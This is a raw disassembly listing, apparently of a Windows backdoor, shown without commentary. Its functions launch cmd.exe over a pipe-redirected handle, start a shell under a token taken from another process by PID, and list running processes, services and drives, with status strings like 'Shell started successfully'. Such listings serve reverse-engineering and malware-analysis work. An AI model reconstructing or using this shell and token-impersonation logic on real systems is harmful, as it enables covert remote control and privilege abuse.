.text:00401AE7 loc_401AE7:             ; 16
.text:00401AE7 push    8
.text:00401AE9 pop     eax             ; 16
.text:00401AEA jmp     short loc_401AE2 ; 16
.text:00401AEA sub_401A4F endp
.text:00401AEA
.text:00401AEC
.text:00401AEC
.text:00401AEC ; Attributes: bp-based frame
.text:00401AEC
.text:00401AEC sub_401AEC proc near
.text:00401AEC
.text:00401AEC Dst= dword ptr -58h
.text:00401AEC var_2C= dword ptr -2Ch
.text:00401AEC var_28= word ptr -28h
.text:00401AEC ProcessInformation= _PROCESS_INFORMATION ptr -14h
.text:00401AEC ModeFlags= dword ptr -4
.text:00401AEC
.text:00401AEC push    ebp             ; 1
.text:00401AED mov     ebp, esp        ; 1
.text:00401AEF sub     esp, 58h        ; 1
.text:00401AF2 lea     eax, [ebp+ModeFlags] ; 1
.text:00401AF5 push    esi             ; 1
.text:00401AF6 push    eax             ; 1
.text:00401AF7 call    ds:GetConsoleDisplayMode ; 1
.text:00401AFD test    eax, eax        ; 1
.text:00401AFF jnz     short loc_401B79 ; 1 Flows to: 2, 6
.text:00401B01 xor     esi, esi        ; 2
.text:00401B03 push    44h             ; 2
.text:00401B05 lea     eax, [ebp+Dst]  ; 2
.text:00401B08 push    esi             ; 2
.text:00401B09 push    eax             ; 2
.text:00401B0A call    memset          ; 2
.text:00401B0F add     esp, 0Ch        ; 2
.text:00401B12 lea     eax, [ebp+ProcessInformation] ; 2
.text:00401B15 mov     [ebp+Dst], 44h  ; 2
.text:00401B1C mov     [ebp+var_2C], 1 ; 2
.text:00401B23 push    eax             ; 2
.text:00401B24 lea     eax, [ebp+Dst]  ; 2
.text:00401B27 push    eax             ; 2
.text:00401B28 push    esi             ; 2
.text:00401B29 push    esi             ; 2
.text:00401B2A push    esi             ; 2
.text:00401B2B push    1               ; 2
.text:00401B2D push    esi             ; 2
.text:00401B2E push    esi             ; 2
.text:00401B2F push    offset CommandLine ; 2
.text:00401B34 push    esi             ; 2
.text:00401B35 mov     [ebp+var_28], si ; 2
.text:00401B39 call    ds:CreateProcessA ; 2
.text:00401B3F test    eax, eax        ; 2
.text:00401B41 jz      short loc_401B5B ; 2 Flows to: 3, 4
.text:00401B43 push    1F4h            ; 3
.text:00401B48 call    ds:Sleep        ; 3
.text:00401B4E push    [ebp+ProcessInformation.dwProcessId] ; 3
.text:00401B51 call    ds:AttachConsole ; 3
.text:00401B57 test    eax, eax        ; 3
.text:00401B59 jnz     short loc_401B5F ; 3 Flows to: 4, 5
.text:00401B5B
.text:00401B5B loc_401B5B:             ; 4
.text:00401B5B xor     eax, eax
.text:00401B5D jmp     short loc_401B7C ; 4 Flows to: 7
.text:00401B5F
.text:00401B5F loc_401B5F:             ; 5
.text:00401B5F push    esi
.text:00401B60 push    [ebp+ProcessInformation.hProcess] ; 5
.text:00401B63 call    ds:TerminateProcess ; 5
.text:00401B69 push    [ebp+ProcessInformation.hProcess] ; 5
.text:00401B6C mov     esi, ds:CloseHandle ; 5
.text:00401B72 call    esi ; CloseHandle ; 5
.text:00401B74 push    [ebp+ProcessInformation.hThread] ; 5
.text:00401B77 call    esi ; CloseHandle ; 5 Flows to: 6
.text:00401B79
.text:00401B79 loc_401B79:             ; 6
.text:00401B79 push    1
.text:00401B7B pop     eax             ; 6 Flows to: 7
.text:00401B7C
.text:00401B7C loc_401B7C:             ; 7
.text:00401B7C pop     esi
.text:00401B7D leave                   ; 7
.text:00401B7E retn                    ; 7
.text:00401B7E sub_401AEC endp
.text:00401B7E
.text:00401B7F
.text:00401B7F
.text:00401B7F ; Attributes: bp-based frame
.text:00401B7F
.text:00401B7F ; int __cdecl sub_401B7F(HANDLE hNamedPipe, DWORD ExitCode, int)
.text:00401B7F sub_401B7F proc near
.text:00401B7F
.text:00401B7F var_C= dword ptr -0Ch
.text:00401B7F NumberOfBytesRead= dword ptr -8
.text:00401B7F BytesRead= dword ptr -4
.text:00401B7F hNamedPipe= dword ptr  8
.text:00401B7F ExitCode= dword ptr  0Ch
.text:00401B7F arg_8= dword ptr  10h
.text:00401B7F
.text:00401B7F push    ebp             ; 1
.text:00401B80 mov     ebp, esp        ; 1
.text:00401B82 sub     esp, 0Ch        ; 1
.text:00401B85 push    ebx             ; 1
.text:00401B86 push    esi             ; 1
.text:00401B87 xor     ebx, ebx        ; 1
.text:00401B89 push    edi             ; 1
.text:00401B8A mov     edi, [ebp+ExitCode] ; 1
.text:00401B8D mov     [ebp+BytesRead], ebx ; 1
.text:00401B90 mov     [ebp+NumberOfBytesRead], ebx ; 1
.text:00401B93 xor     esi, esi        ; 1
.text:00401B95 mov     [ebp+var_C], ebx ; 1 Flows to: 2
.text:00401B98
.text:00401B98 loc_401B98:             ; 2
.text:00401B98 lea     eax, [ebp+ExitCode]
.text:00401B9B push    eax             ; 2
.text:00401B9C push    Dst             ; 2
.text:00401BA2 call    ds:GetExitCodeProcess ; 2
.text:00401BA8 cmp     [ebp+ExitCode], 103h ; 2
.text:00401BAF jnz     short loc_401C17 ; 2 Flows to: 3, 11
.text:00401BB1 push    ebx             ; 3
.text:00401BB2 lea     eax, [ebp+BytesRead] ; 3
.text:00401BB5 push    ebx             ; 3
.text:00401BB6 push    eax             ; 3
.text:00401BB7 mov     eax, 10000h     ; 3
.text:00401BBC sub     eax, esi        ; 3
.text:00401BBE push    eax             ; 3
.text:00401BBF lea     eax, [esi+edi]  ; 3
.text:00401BC2 push    eax             ; 3
.text:00401BC3 push    [ebp+hNamedPipe] ; 3
.text:00401BC6 call    ds:PeekNamedPipe ; 3
.text:00401BCC cmp     [ebp+arg_8], ebx ; 3
.text:00401BCF jz      short loc_401BE9 ; 3 Flows to: 4, 7
.text:00401BD1 cmp     [ebp+BytesRead], ebx ; 4
.text:00401BD4 jnz     short loc_401BE9 ; 4 Flows to: 5, 7
.text:00401BD6 cmp     [ebp+var_C], 28h ; 5
.text:00401BDA jnb     short loc_401BE9 ; 5 Flows to: 6, 7
.text:00401BDC push    32h             ; 6
.text:00401BDE call    ds:Sleep        ; 6
.text:00401BE4 inc     [ebp+var_C]     ; 6
.text:00401BE7 jmp     short loc_401B98 ; 6 Flows to: 2
.text:00401BE9
.text:00401BE9 loc_401BE9:             ; 7
.text:00401BE9 cmp     [ebp+BytesRead], ebx
.text:00401BEC mov     [ebp+NumberOfBytesRead], ebx ; 7
.text:00401BEF jz      short loc_401C56 ; 7 Flows to: 8, 12
.text:00401BF1 lea     eax, [ebp+NumberOfBytesRead] ; 8
.text:00401BF4 push    ebx             ; 8
.text:00401BF5 push    eax             ; 8
.text:00401BF6 lea     eax, [esi+edi]  ; 8
.text:00401BF9 push    [ebp+BytesRead] ; 8
.text:00401BFC push    eax             ; 8
.text:00401BFD push    [ebp+hNamedPipe] ; 8
.text:00401C00 call    ds:ReadFile     ; 8
.text:00401C06 test    eax, eax        ; 8
.text:00401C08 jz      short loc_401C56 ; 8 Flows to: 9, 12
.text:00401C0A add     esi, [ebp+NumberOfBytesRead] ; 9
.text:00401C0D cmp     [ebp+NumberOfBytesRead], ebx ; 9
.text:00401C10 mov     [ebp+arg_8], ebx ; 9
.text:00401C13 jz      short loc_401C56 ; 9 Flows to: 10, 12
.text:00401C15 jmp     short loc_401B98 ; 10 Flows to: 2
.text:00401C17
.text:00401C17 loc_401C17:             ; 11
.text:00401C17 push    Dst
.text:00401C1D mov     esi, ds:CloseHandle ; 11
.text:00401C23 mov     dword_405900, ebx ; 11
.text:00401C29 call    esi ; CloseHandle ; 11
.text:00401C2B push    dword_4058D4    ; 11
.text:00401C31 call    esi ; CloseHandle ; 11
.text:00401C33 push    10h             ; 11
.text:00401C35 push    ebx             ; 11
.text:00401C36 push    offset Dst      ; 11
.text:00401C3B call    memset          ; 11
.text:00401C40 push    offset aProcessCmdExeE ; 11
.text:00401C45 push    edi             ; 11
.text:00401C46 call    strcpy          ; 11
.text:00401C4B push    edi             ; 11
.text:00401C4C call    strlen          ; 11
.text:00401C51 add     esp, 18h        ; 11
.text:00401C54 mov     esi, eax        ; 11 Flows to: 12
.text:00401C56
.text:00401C56 loc_401C56:             ; 12
.text:00401C56 mov     eax, esi
.text:00401C58 pop     edi             ; 12
.text:00401C59 pop     esi             ; 12
.text:00401C5A pop     ebx             ; 12
.text:00401C5B leave                   ; 12
.text:00401C5C retn                    ; 12
.text:00401C5C sub_401B7F endp
.text:00401C5C
.text:00401C5D
.text:00401C5D
.text:00401C5D ; Attributes: bp-based frame
.text:00401C5D
.text:00401C5D ; int __cdecl sub_401C5D(char *, HANDLE hHandle)
.text:00401C5D sub_401C5D proc near
.text:00401C5D
.text:00401C5D Source= byte ptr -270h
.text:00401C5D Dst= byte ptr -170h
.text:00401C5D StartupInfo= _STARTUPINFOA ptr -68h
.text:00401C5D Dest= byte ptr -24h
.text:00401C5D TokenHandle= dword ptr -4
.text:00401C5D arg_0= dword ptr  8
.text:00401C5D hHandle= dword ptr  0Ch
.text:00401C5D
.text:00401C5D push    ebp             ; 1
.text:00401C5E mov     ebp, esp        ; 1
.text:00401C60 sub     esp, 270h       ; 1
.text:00401C66 cmp     [ebp+hHandle], 0FFFFFFFFh ; 1
.text:00401C6A push    ebx             ; 1
.text:00401C6B push    esi             ; 1
.text:00401C6C push    edi             ; 1
.text:00401C6D jz      loc_401ED4      ; 1 Flows to: 2, 27
.text:00401C73 xor     esi, esi        ; 2
.text:00401C75 cmp     dword_405900, esi ; 2
.text:00401C7B jnz     loc_401EA3      ; 2 Flows to: 3, 26
.text:00401C81 mov     ebx, [ebp+arg_0] ; 3
.text:00401C84 push    ebx             ; 3
.text:00401C85 call    sub_401AEC      ; 3
.text:00401C8A test    eax, eax        ; 3
.text:00401C8C pop     ecx             ; 3
.text:00401C8D jz      loc_401E85      ; 3 Flows to: 4, 22
.text:00401C93 push    [ebp+hHandle]   ; 4
.text:00401C96 mov     edi, ds:SetStdHandle ; 4
.text:00401C9C push    0FFFFFFF5h      ; 4
.text:00401C9E call    edi ; SetStdHandle ; 4
.text:00401CA0 test    eax, eax        ; 4
.text:00401CA2 jz      loc_401E85      ; 4 Flows to: 5, 22
.text:00401CA8 push    [ebp+hHandle]   ; 5
.text:00401CAB push    0FFFFFFF4h      ; 5
.text:00401CAD call    edi ; SetStdHandle ; 5
.text:00401CAF mov     edi, 104h       ; 5
.text:00401CB4 lea     eax, [ebp+Dst]  ; 5
.text:00401CBA push    edi             ; 5
.text:00401CBB push    eax             ; 5
.text:00401CBC push    offset Src      ; 5
.text:00401CC1 call    ds:ExpandEnvironmentStringsA ; 5
.text:00401CC7 test    eax, eax        ; 5
.text:00401CC9 jnz     short loc_401CEC ; 5 Flows to: 6, 7
.text:00401CCB lea     eax, [ebp+Dst]  ; 6
.text:00401CD1 push    edi             ; 6
.text:00401CD2 push    eax             ; 6
.text:00401CD3 call    ds:GetSystemDirectoryA ; 6
.text:00401CD9 lea     eax, [ebp+Dst]  ; 6
.text:00401CDF push    offset aCmdExe_0 ; 6
.text:00401CE4 push    eax             ; 6
.text:00401CE5 call    strcat          ; 6
.text:00401CEA pop     ecx             ; 6
.text:00401CEB pop     ecx             ; 6 Flows to: 7
.text:00401CEC
.text:00401CEC loc_401CEC:             ; 7
.text:00401CEC lea     eax, [ebp+Dst]
.text:00401CF2 push    eax             ; 7
.text:00401CF3 call    ds:GetFileAttributesA ; 7
.text:00401CF9 cmp     eax, 0FFFFFFFFh ; 7
.text:00401CFC jnz     short loc_401D26 ; 7 Flows to: 8, 9
.text:00401CFE call    ds:GetLastError ; 8
.text:00401D04 push    eax             ; 8
.text:00401D05 lea     eax, [ebp+Dest] ; 8
.text:00401D08 push    offset aGetfileattribu ; 8
.text:00401D0D push    eax             ; 8
.text:00401D0E call    ds:sprintf      ; 8
.text:00401D14 lea     eax, [ebp+Dest] ; 8
.text:00401D17 push    eax             ; 8
.text:00401D18 push    ebx             ; 8
.text:00401D19 call    strcat          ; 8
.text:00401D1E add     esp, 14h        ; 8
.text:00401D21 jmp     loc_401E85      ; 8 Flows to: 22
.text:00401D26
.text:00401D26 loc_401D26:             ; 9
.text:00401D26 push    offset aCmdpath
.text:00401D2B push    ebx             ; 9
.text:00401D2C call    strcat          ; 9
.text:00401D31 lea     eax, [ebp+Dst]  ; 9
.text:00401D37 push    eax             ; 9
.text:00401D38 push    ebx             ; 9
.text:00401D39 call    strcat          ; 9
.text:00401D3E push    offset asc_405224 ; 9
.text:00401D43 push    ebx             ; 9
.text:00401D44 call    strcat          ; 9
.text:00401D49 push    44h             ; 9
.text:00401D4B lea     eax, [ebp+StartupInfo] ; 9
.text:00401D4E pop     edi             ; 9
.text:00401D4F push    edi             ; 9
.text:00401D50 push    esi             ; 9
.text:00401D51 push    eax             ; 9
.text:00401D52 call    memset          ; 9
.text:00401D57 mov     eax, Str        ; 9
.text:00401D5C add     esp, 24h        ; 9
.text:00401D5F mov     [ebp+StartupInfo.cb], edi ; 9
.text:00401D62 cmp     eax, esi        ; 9
.text:00401D64 push    1               ; 9
.text:00401D66 mov     [ebp+StartupInfo.wShowWindow], si ; 9
.text:00401D6A pop     edi             ; 9
.text:00401D6B mov     [ebp+StartupInfo.dwFlags], edi ; 9
.text:00401D6E jz      loc_401E53      ; 9 Flows to: 10, 19
.text:00401D74 cmp     lpServiceName, esi ; 10
.text:00401D7A jnz     loc_401E53      ; 10 Flows to: 11, 19
.text:00401D80 push    eax             ; 11
.text:00401D81 call    ds:atol         ; 11
.text:00401D87 cmp     eax, esi        ; 11
.text:00401D89 pop     ecx             ; 11
.text:00401D8A jz      loc_401E53      ; 11 Flows to: 12, 19
.text:00401D90 push    eax             ; 12
.text:00401D91 push    esi             ; 12
.text:00401D92 push    1F0FFFh         ; 12
.text:00401D97 call    ds:OpenProcess  ; 12
.text:00401D9D mov     ebx, eax        ; 12
.text:00401D9F cmp     ebx, 0FFFFFFFFh ; 12
.text:00401DA2 jnz     short loc_401DD4 ; 12 Flows to: 13, 14
.text:00401DA4 call    ds:GetLastError ; 13
.text:00401DAA push    eax             ; 13
.text:00401DAB lea     eax, [ebp+Source] ; 13
.text:00401DB1 push    offset aOpenpFailedWit ; 13
.text:00401DB6 push    eax             ; 13
.text:00401DB7 call    ds:sprintf      ; 13
.text:00401DBD lea     eax, [ebp+Source] ; 13
.text:00401DC3 push    eax             ; 13
.text:00401DC4 push    [ebp+arg_0]     ; 13
.text:00401DC7 call    strcat          ; 13
.text:00401DCC add     esp, 14h        ; 13
.text:00401DCF jmp     loc_401ED4      ; 13 Flows to: 27
.text:00401DD4
.text:00401DD4 loc_401DD4:             ; 14
.text:00401DD4 lea     eax, [ebp+TokenHandle]
.text:00401DD7 push    eax             ; 14
.text:00401DD8 push    0Bh             ; 14
.text:00401DDA push    ebx             ; 14
.text:00401DDB call    ds:OpenProcessToken ; 14
.text:00401DE1 test    eax, eax        ; 14
.text:00401DE3 jz      short loc_401E11 ; 14 Flows to: 15, 17
.text:00401DE5 lea     eax, [ebp+StartupInfo] ; 15
.text:00401DE8 push    offset Dst      ; 15
.text:00401DED push    eax             ; 15
.text:00401DEE push    esi             ; 15
.text:00401DEF push    esi             ; 15
.text:00401DF0 push    esi             ; 15
.text:00401DF1 push    edi             ; 15
.text:00401DF2 push    esi             ; 15
.text:00401DF3 lea     eax, [ebp+Dst]  ; 15
.text:00401DF9 push    esi             ; 15
.text:00401DFA push    eax             ; 15
.text:00401DFB push    esi             ; 15
.text:00401DFC push    [ebp+TokenHandle] ; 15
.text:00401DFF call    ds:CreateProcessAsUserA ; 15
.text:00401E05 test    eax, eax        ; 15
.text:00401E07 jz      short loc_401E3C ; 15 Flows to: 16, 18
.text:00401E09 mov     dword_405900, edi ; 16
.text:00401E0F jmp     short loc_401E3C ; 16 Flows to: 18
.text:00401E11
.text:00401E11 loc_401E11:             ; 17
.text:00401E11 call    ds:GetLastError
.text:00401E17 push    eax             ; 17
.text:00401E18 lea     eax, [ebp+Source] ; 17
.text:00401E1E push    offset aOpentFailedWit ; 17
.text:00401E23 push    eax             ; 17
.text:00401E24 call    ds:sprintf      ; 17
.text:00401E2A lea     eax, [ebp+Source] ; 17
.text:00401E30 push    eax             ; 17
.text:00401E31 push    [ebp+arg_0]     ; 17
.text:00401E34 call    strcat          ; 17
.text:00401E39 add     esp, 14h        ; 17 Flows to: 18
.text:00401E3C
.text:00401E3C loc_401E3C:             ; 18
.text:00401E3C push    ebx
.text:00401E3D call    ds:CloseHandle  ; 18
.text:00401E43 push    1F4h            ; 18
.text:00401E48 call    ds:Sleep        ; 18
.text:00401E4E mov     ebx, [ebp+arg_0] ; 18
.text:00401E51 jmp     short loc_401E85 ; 18 Flows to: 22
.text:00401E53
.text:00401E53 loc_401E53:             ; 19
.text:00401E53 lea     eax, [ebp+StartupInfo]
.text:00401E56 push    offset Dst      ; 19
.text:00401E5B push    eax             ; 19
.text:00401E5C push    esi             ; 19
.text:00401E5D push    esi             ; 19
.text:00401E5E push    esi             ; 19
.text:00401E5F push    edi             ; 19
.text:00401E60 push    esi             ; 19
.text:00401E61 lea     eax, [ebp+Dst]  ; 19
.text:00401E67 push    esi             ; 19
.text:00401E68 push    eax             ; 19
.text:00401E69 push    esi             ; 19
.text:00401E6A call    ds:CreateProcessA ; 19
.text:00401E70 test    eax, eax        ; 19
.text:00401E72 jz      short loc_401E7A ; 19 Flows to: 20, 21
.text:00401E74 mov     dword_405900, edi ; 20 Flows to: 21
.text:00401E7A
.text:00401E7A loc_401E7A:             ; 21
.text:00401E7A push    1F4h
.text:00401E7F call    ds:Sleep        ; 21 Flows to: 22
.text:00401E85
.text:00401E85 loc_401E85:             ; 22
.text:00401E85 cmp     dword_405900, esi
.text:00401E8B jz      short loc_401E9C ; 22 Flows to: 23, 25
.text:00401E8D push    offset aShellStartedSu ; 23 Flows to: 24
.text:00401E92
.text:00401E92 loc_401E92:             ; 24
.text:00401E92 push    ebx
.text:00401E93 call    strcat          ; 24
.text:00401E98 pop     ecx             ; 24
.text:00401E99 pop     ecx             ; 24
.text:00401E9A jmp     short loc_401ED4 ; 24 Flows to: 27
.text:00401E9C
.text:00401E9C loc_401E9C:             ; 25
.text:00401E9C push    offset aShellStartedFa
.text:00401EA1 jmp     short loc_401E92 ; 25 Flows to: 24
.text:00401EA3
.text:00401EA3 loc_401EA3:             ; 26
.text:00401EA3 push    offset aStartedAlready
.text:00401EA8 push    [ebp+arg_0]     ; 26
.text:00401EAB call    strcat          ; 26
.text:00401EB0 push    dword_4058D8    ; 26
.text:00401EB6 lea     eax, [ebp+Dest] ; 26
.text:00401EB9 push    offset aAndThePidIsD ; 26
.text:00401EBE push    eax             ; 26
.text:00401EBF call    ds:sprintf      ; 26
.text:00401EC5 lea     eax, [ebp+Dest] ; 26
.text:00401EC8 push    eax             ; 26
.text:00401EC9 push    [ebp+arg_0]     ; 26
.text:00401ECC call    strcat          ; 26
.text:00401ED1 add     esp, 1Ch        ; 26 Flows to: 27
.text:00401ED4
.text:00401ED4 loc_401ED4:             ; 27
.text:00401ED4 pop     edi
.text:00401ED5 pop     esi             ; 27
.text:00401ED6 pop     ebx             ; 27
.text:00401ED7 leave                   ; 27
.text:00401ED8 retn                    ; 27
.text:00401ED8 sub_401C5D endp
.text:00401ED8
.text:00401ED9
.text:00401ED9
.text:00401ED9 ; Attributes: bp-based frame
.text:00401ED9
.text:00401ED9 ; int __cdecl sub_401ED9(char *)
.text:00401ED9 sub_401ED9 proc near
.text:00401ED9
.text:00401ED9 var_464= dword ptr -464h
.text:00401ED9 Dst= dword ptr -240h
.text:00401ED9 var_238= dword ptr -238h
.text:00401ED9 VolumeNameBuffer= byte ptr -220h
.text:00401ED9 var_21C= byte ptr -21Ch
.text:00401ED9 Dest= byte ptr -118h
.text:00401ED9 pcbBytesNeeded= dword ptr -18h
.text:00401ED9 String1= byte ptr -14h
.text:00401ED9 var_13= byte ptr -13h
.text:00401ED9 var_10= dword ptr -10h
.text:00401ED9 hSCObject= dword ptr -0Ch
.text:00401ED9 ServicesReturned= dword ptr -8
.text:00401ED9 var_1= byte ptr -1
.text:00401ED9 arg_0= dword ptr  8
.text:00401ED9
.text:00401ED9 push    ebp             ; 1
.text:00401EDA mov     ebp, esp        ; 1
.text:00401EDC sub     esp, 464h       ; 1
.text:00401EE2 mov     eax, Str        ; 1
.text:00401EE7 push    ebx             ; 1
.text:00401EE8 xor     ebx, ebx        ; 1
.text:00401EEA push    esi             ; 1
.text:00401EEB cmp     eax, ebx        ; 1
.text:00401EED push    edi             ; 1
.text:00401EEE jnz     short loc_401EFA ; 1 Flows to: 2, 3
.text:00401EF0 push    offset aSyntaxErrorUsa ; 2
.text:00401EF5 jmp     loc_402021      ; 2 Flows to: 15
.text:00401EFA
.text:00401EFA loc_401EFA:             ; 3
.text:00401EFA mov     esi, ds:_strcmpi
.text:00401F00 push    eax             ; 3
.text:00401F01 push    offset aP       ; 3
.text:00401F06 call    esi ; _strcmpi  ; 3
.text:00401F08 pop     ecx             ; 3
.text:00401F09 test    eax, eax        ; 3
.text:00401F0B pop     ecx             ; 3
.text:00401F0C jnz     loc_401FBD      ; 3 Flows to: 4, 10
.text:00401F12 mov     edi, 128h       ; 4
.text:00401F17 lea     eax, [ebp+Dst]  ; 4
.text:00401F1D push    edi             ; 4
.text:00401F1E push    ebx             ; 4
.text:00401F1F push    eax             ; 4
.text:00401F20 call    memset          ; 4
.text:00401F25 mov     esi, 224h       ; 4
.text:00401F2A lea     eax, [ebp+var_464] ; 4
.text:00401F30 push    esi             ; 4
.text:00401F31 push    ebx             ; 4
.text:00401F32 push    eax             ; 4
.text:00401F33 call    memset          ; 4
.text:00401F38 add     esp, 18h        ; 4
.text:00401F3B push    ebx             ; 4
.text:00401F3C push    2               ; 4
.text:00401F3E call    CreateToolhelp32Snapshot ; 4
.text:00401F43 mov     ebx, eax        ; 4
.text:00401F45 cmp     ebx, 0FFFFFFFFh ; 4
.text:00401F48 jnz     short loc_401F54 ; 4 Flows to: 5, 6
.text:00401F4A push    offset aListProcessFai ; 5
.text:00401F4F jmp     loc_402021      ; 5 Flows to: 15
.text:00401F54
.text:00401F54 loc_401F54:             ; 6
.text:00401F54 lea     eax, [ebp+Dst]
.text:00401F5A mov     [ebp+Dst], edi  ; 6
.text:00401F60 push    eax             ; 6
.text:00401F61 push    ebx             ; 6
.text:00401F62 mov     [ebp+var_464], esi ; 6
.text:00401F68 call    Process32First  ; 6 Flows to: 7
.text:00401F6D
.text:00401F6D loc_401F6D:             ; 7
.text:00401F6D test    eax, eax
.text:00401F6F jz      short loc_401FB1 ; 7 Flows to: 8, 9
.text:00401F71 push    [ebp+var_238]   ; 8
.text:00401F77 lea     eax, [ebp+var_21C] ; 8
.text:00401F7D push    eax             ; 8
.text:00401F7E lea     eax, [ebp+Dest] ; 8
.text:00401F84 push    offset a26s5d   ; 8
.text:00401F89 push    eax             ; 8
.text:00401F8A call    ds:sprintf      ; 8
.text:00401F90 lea     eax, [ebp+Dest] ; 8
.text:00401F96 push    eax             ; 8
.text:00401F97 push    [ebp+arg_0]     ; 8
.text:00401F9A call    strcat          ; 8
.text:00401F9F add     esp, 18h        ; 8
.text:00401FA2 lea     eax, [ebp+Dst]  ; 8
.text:00401FA8 push    eax             ; 8
.text:00401FA9 push    ebx             ; 8
.text:00401FAA call    Process32Next   ; 8
.text:00401FAF jmp     short loc_401F6D ; 8 Flows to: 7
.text:00401FB1
.text:00401FB1 loc_401FB1:             ; 9
.text:00401FB1 push    ebx
.text:00401FB2 call    ds:CloseHandle  ; 9
.text:00401FB8 jmp     loc_4021F4      ; 9 Flows to: 44
.text:00401FBD
.text:00401FBD loc_401FBD:             ; 10
.text:00401FBD push    Str
.text:00401FC3 push    offset aS       ; 10
.text:00401FC8 call    esi ; _strcmpi  ; 10
.text:00401FCA pop     ecx             ; 10
.text:00401FCB test    eax, eax        ; 10
.text:00401FCD pop     ecx             ; 10
.text:00401FCE jnz     loc_402097      ; 10 Flows to: 11, 20
.text:00401FD4 push    4               ; 11
.text:00401FD6 push    ebx             ; 11
.text:00401FD7 push    ebx             ; 11
.text:00401FD8 call    ds:OpenSCManagerA ; 11
.text:00401FDE cmp     eax, ebx        ; 11
.text:00401FE0 mov     [ebp+hSCObject], eax ; 11
.text:00401FE3 jz      short loc_40201C ; 11 Flows to: 12, 14
.text:00401FE5 push    ebx             ; 12
.text:00401FE6 lea     ecx, [ebp+ServicesReturned] ; 12
.text:00401FE9 push    ebx             ; 12
.text:00401FEA push    ecx             ; 12
.text:00401FEB lea     ecx, [ebp+pcbBytesNeeded] ; 12
.text:00401FEE mov     esi, ds:EnumServicesStatusExA ; 12
.text:00401FF4 push    ecx             ; 12
.text:00401FF5 push    ebx             ; 12
.text:00401FF6 push    ebx             ; 12
.text:00401FF7 push    1               ; 12
.text:00401FF9 push    30h             ; 12
.text:00401FFB push    ebx             ; 12
.text:00401FFC push    eax             ; 12
.text:00401FFD call    esi ; EnumServicesStatusExA ; 12
.text:00401FFF mov     eax, [ebp+pcbBytesNeeded] ; 12
.text:00402002 lea     edi, [eax+1]    ; 12
.text:00402005 push    edi             ; 12
.text:00402006 call    ??2@YAPAXI@Z    ; 12
.text:0040200B cmp     eax, ebx        ; 12
.text:0040200D pop     ecx             ; 12
.text:0040200E mov     [ebp+var_10], eax ; 12
.text:00402011 jnz     short loc_402030 ; 12 Flows to: 13, 16
.text:00402013 push    [ebp+hSCObject] ; 13
.text:00402016 call    ds:CloseServiceHandle ; 13 Flows to: 14
.text:0040201C
.text:0040201C loc_40201C:             ; 14 Flows to: 15
.text:0040201C push    offset aListServiceFai
.text:00402021
.text:00402021 loc_402021:             ; 15
.text:00402021 push    [ebp+arg_0]
.text:00402024 call    strcat          ; 15
.text:00402029 pop     ecx             ; 15
.text:0040202A pop     ecx             ; 15
.text:0040202B jmp     loc_4021F4      ; 15 Flows to: 44
.text:00402030
.text:00402030 loc_402030:             ; 16
.text:00402030 push    ebx
.text:00402031 lea     ecx, [ebp+ServicesReturned] ; 16
.text:00402034 push    ebx             ; 16
.text:00402035 push    ecx             ; 16
.text:00402036 lea     ecx, [ebp+pcbBytesNeeded] ; 16
.text:00402039 push    ecx             ; 16
.text:0040203A push    edi             ; 16
.text:0040203B push    eax             ; 16
.text:0040203C push    1               ; 16
.text:0040203E push    30h             ; 16
.text:00402040 push    ebx             ; 16
.text:00402041 push    [ebp+hSCObject] ; 16
.text:00402044 call    esi ; EnumServicesStatusExA ; 16
.text:00402046 cmp     [ebp+ServicesReturned], ebx ; 16
.text:00402049 jbe     short loc_402080 ; 16 Flows to: 17, 19
.text:0040204B mov     esi, [ebp+var_10] ; 17 Flows to: 18
.text:0040204E
.text:0040204E loc_40204E:             ; 18
.text:0040204E push    dword ptr [esi+4]
.text:00402051 lea     eax, [ebp+Dest] ; 18
.text:00402057 push    dword ptr [esi] ; 18
.text:00402059 push    offset a24sS    ; 18
.text:0040205E push    eax             ; 18
.text:0040205F call    ds:sprintf      ; 18
.text:00402065 lea     eax, [ebp+Dest] ; 18
.text:0040206B push    eax             ; 18
.text:0040206C push    [ebp+arg_0]     ; 18
.text:0040206F call    strcat          ; 18
.text:00402074 add     esp, 18h        ; 18
.text:00402077 inc     ebx             ; 18
.text:00402078 add     esi, 2Ch        ; 18
.text:0040207B cmp     ebx, [ebp+ServicesReturned] ; 18
.text:0040207E jb      short loc_40204E ; 18 Flows to: 19, 18
.text:00402080
.text:00402080 loc_402080:             ; 19
.text:00402080 push    [ebp+var_10]
.text:00402083 call    ??3@YAXPAX@Z    ; 19
.text:00402088 pop     ecx             ; 19
.text:00402089 push    [ebp+hSCObject] ; 19
.text:0040208C call    ds:CloseServiceHandle ; 19
.text:00402092 jmp     loc_4021F4      ; 19 Flows to: 44
.text:00402097
.text:00402097 loc_402097:             ; 20
.text:00402097 push    Str
.text:0040209D push    offset aD       ; 20
.text:004020A2 call    esi ; _strcmpi  ; 20
.text:004020A4 pop     ecx             ; 20
.text:004020A5 test    eax, eax        ; 20
.text:004020A7 pop     ecx             ; 20
.text:004020A8 jnz     loc_4021F4      ; 20 Flows to: 21, 44
.text:004020AE mov     [ebp+hSCObject], ebx ; 21
.text:004020B1 call    ds:GetLogicalDrives ; 21
.text:004020B7 mov     esi, ds:sprintf ; 21
.text:004020BD mov     [ebp+ServicesReturned], eax ; 21
.text:004020C0 lea     eax, [ebp+Dest] ; 21
.text:004020C6 push    offset aVolumeOnThisCo ; 21
.text:004020CB push    eax             ; 21
.text:004020CC mov     [ebp+var_1], 41h ; 21
.text:004020D0 call    esi ; sprintf   ; 21
.text:004020D2 mov     edi, [ebp+arg_0] ; 21
.text:004020D5 lea     eax, [ebp+Dest] ; 21
.text:004020DB push    eax             ; 21
.text:004020DC push    edi             ; 21
.text:004020DD call    strcat          ; 21
.text:004020E2 add     esp, 10h        ; 21 Flows to: 22
.text:004020E5
.text:004020E5 loc_4020E5:             ; 22
.text:004020E5 cmp     [ebp+ServicesReturned], ebx
.text:004020E8 jz      loc_4021D3      ; 22 Flows to: 23, 43
.text:004020EE test    byte ptr [ebp+ServicesReturned], 1 ; 23
.text:004020F2 jz      loc_4021C8      ; 23 Flows to: 24, 42
.text:004020F8 movsx   eax, [ebp+var_1] ; 24
.text:004020FC push    eax             ; 24
.text:004020FD lea     eax, [ebp+Dest] ; 24
.text:00402103 push    offset aC       ; 24
.text:00402108 push    eax             ; 24
.text:00402109 call    esi ; sprintf   ; 24
.text:0040210B lea     eax, [ebp+Dest] ; 24
.text:00402111 push    eax             ; 24
.text:00402112 push    edi             ; 24
.text:00402113 call    strcat          ; 24
.text:00402118 mov     al, [ebp+var_1] ; 24
.text:0040211B add     esp, 14h        ; 24
.text:0040211E mov     [ebp+String1], al ; 24
.text:00402121 lea     eax, [ebp+String1] ; 24
